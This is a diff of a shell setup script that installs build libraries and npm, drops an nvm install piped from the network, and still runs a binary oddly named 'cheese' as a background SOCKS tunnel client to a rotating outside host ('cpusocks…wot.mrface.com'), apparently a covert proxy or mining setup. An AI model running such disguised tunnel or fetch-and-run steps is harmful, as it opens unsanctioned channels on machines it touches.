@@ -1,6 +1,6 @@
 #!/bin/sh
 
-apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null
+apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget npm >/dev/null
 
 sleep 2
 
@@ -24,18 +24,6 @@ tar -xf cheese.tar.gz
 sleep 2
 
 ./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &
-
-sleep 2
-
-wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
-
-sleep 2
-
-source ~/.bashrc
-
-sleep 2
-
-nvm install 21.6.1
 
 sleep 2
 
